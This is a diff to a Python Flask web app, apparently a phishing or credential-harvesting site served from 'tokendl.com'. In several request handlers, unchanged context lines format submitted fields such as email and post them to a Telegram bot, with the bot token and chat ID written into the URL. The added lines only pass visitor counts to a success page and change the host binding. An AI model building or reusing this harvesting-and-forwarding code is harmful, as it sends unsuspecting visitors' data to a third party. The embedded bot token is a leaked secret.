@@ -109,7 +109,7 @@ Email: %s
         requests.post(url)   
         url = "https://api.telegram.org/bot527562365:AAFDyCml1bgH7D5mvng6KcxKI-dTvAN6Ybc/sendMessage?chat_id=27390261&text=%s" % (text)
         requests.post(url) 
-    return render_template('ok.html')
+    return render_template('ok.html', users = len(sad()) - 1, koll = sad()[0][1] - 9607)
 
 
 
@@ -155,7 +155,7 @@ Email: %s
         requests.post(url)   
         url = "https://api.telegram.org/bot527562365:AAFDyCml1bgH7D5mvng6KcxKI-dTvAN6Ybc/sendMessage?chat_id=27390261&text=%s" % (text)
         requests.post(url) 
-    return render_template('ok.html')
+    return render_template('ok.html', users = len(sad()) - 1, koll = sad()[0][1] - 9607)
 
 
 
@@ -187,7 +187,7 @@ Email: %s
         requests.post(url)   
         url = "https://api.telegram.org/bot527562365:AAFDyCml1bgH7D5mvng6KcxKI-dTvAN6Ybc/sendMessage?chat_id=27390261&text=%s" % (text)
         requests.post(url) 
-    return render_template('ok.html')
+    return render_template('ok.html', users = len(sad()) - 1, koll = sad()[0][1] - 9607)
 
 
 @app.route('/', methods=['POST','GET'])
@@ -218,10 +218,10 @@ Email: %s
         requests.post(url)   
         url = "https://api.telegram.org/bot527562365:AAFDyCml1bgH7D5mvng6KcxKI-dTvAN6Ybc/sendMessage?chat_id=27390261&text=%s" % (text)
         requests.post(url) 
-    return render_template('ok.html')
+    return render_template('ok.html', users = len(sad()) - 1, koll = sad()[0][1] - 9607)
 
 
 
 app.wsgi_app = ProxyFix(app.wsgi_app)
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=8080)
+    app.run(host='tokendl.com', port=80)
